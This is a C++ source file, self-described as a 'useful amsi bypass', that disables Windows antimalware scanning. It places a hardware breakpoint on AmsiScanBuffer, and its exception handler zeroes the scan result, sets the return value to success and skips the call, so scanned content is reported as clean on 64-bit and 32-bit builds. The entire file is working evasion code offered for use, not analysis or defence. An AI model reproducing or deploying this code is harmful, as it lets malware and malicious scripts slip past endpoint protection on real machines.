// useful amsi bypass xd

#include "hbp.h"
#include <intrin.h>
#pragma intrinsic(__readmsr, __writemsr)
LPVOID hardwarebreakpoint::pABuF = nullptr;
LPVOID hardwarebreakpoint::pCtx = nullptr;
LONG WINAPI hardwarebreakpoint::exceptionhandler(PEXCEPTION_POINTERS exceptions) {
    if (exceptions->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP &&
        exceptions->ExceptionRecord->ExceptionAddress == pABuF) {
#ifdef _WIN64
        ULONG_PTR returnaddress = *(ULONG_PTR*)exceptions->ContextRecord->Rsp;
        ULONG_PTR scanresult = *(ULONG_PTR*)(exceptions->ContextRecord->Rsp + (6 * 8));
        *(DWORD*)scanresult = 0;
        exceptions->ContextRecord->Rip = returnaddress;
        exceptions->ContextRecord->Rsp += 8;
        exceptions->ContextRecord->Rax = 0;
#else
        ULONG_PTR returnaddress = *(ULONG_PTR*)exceptions->ContextRecord->Esp;
        ULONG_PTR scanresult = *(ULONG_PTR*)(exceptions->ContextRecord->Esp + (6 * 4));
        *(DWORD*)scanresult = 0;
        exceptions->ContextRecord->Eip = returnaddress;
        exceptions->ContextRecord->Esp += 4;
        exceptions->ContextRecord->Eax = 0;
#endif
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}
void hardwarebreakpoint::enablebreakpoint(PCONTEXT ctx, LPVOID address, int index) {
#ifdef _WIN64
    switch (index) {
    case 0: ctx->Dr0 = (ULONG_PTR)address; break;
    case 1: ctx->Dr1 = (ULONG_PTR)address; break;
    case 2: ctx->Dr2 = (ULONG_PTR)address; break;
    case 3: ctx->Dr3 = (ULONG_PTR)address; break;
    }
    ctx->Dr7 = setbits(ctx->Dr7, 16, 2, 0);
    ctx->Dr7 = setbits(ctx->Dr7, (index * 2), 1, 1);
    ctx->Dr6 = 0;
#else
    switch (index) {
    case 0: ctx->Dr0 = (DWORD)address; break;
    case 1: ctx->Dr1 = (DWORD)address; break;
    case 2: ctx->Dr2 = (DWORD)address; break;
    case 3: ctx->Dr3 = (DWORD)address; break;
    }
    ctx->Dr7 = (DWORD)setbits(ctx->Dr7, 16, 2, 0);
    ctx->Dr7 = (DWORD)setbits(ctx->Dr7, (index * 2), 1, 1);
    ctx->Dr6 = 0;
#endif
}
ULONG_PTR hardwarebreakpoint::setbits(ULONG_PTR dw, int lowbit, int bits, ULONG_PTR newvalue) {
    ULONG_PTR mask = (1ULL << bits) - 1ULL;
    dw = (dw & ~(mask << lowbit)) | (newvalue << lowbit);
    return dw;
}
bool hardwarebreakpoint::bypass() {
    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (!amsi) return false;
    pABuF = GetProcAddress(amsi, "AmsiScanBuffer");
    if (!pABuF) return false;
    pCtx = VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pCtx) return false;
    AddVectoredExceptionHandler(1, (PVECTORED_EXCEPTION_HANDLER)exceptionhandler);
    CONTEXT ctx = { 0 };
#ifdef _WIN64
    ctx.ContextFlags = CONTEXT_ALL;
#else
    ctx.ContextFlags = CONTEXT_ALL;
#endif
    HANDLE thread = GetCurrentThread();
    if (!GetThreadContext(thread, &ctx)) return false;
    enablebreakpoint(&ctx, pABuF, 0);
    if (!SetThreadContext(thread, &ctx)) return false;
    return true;
}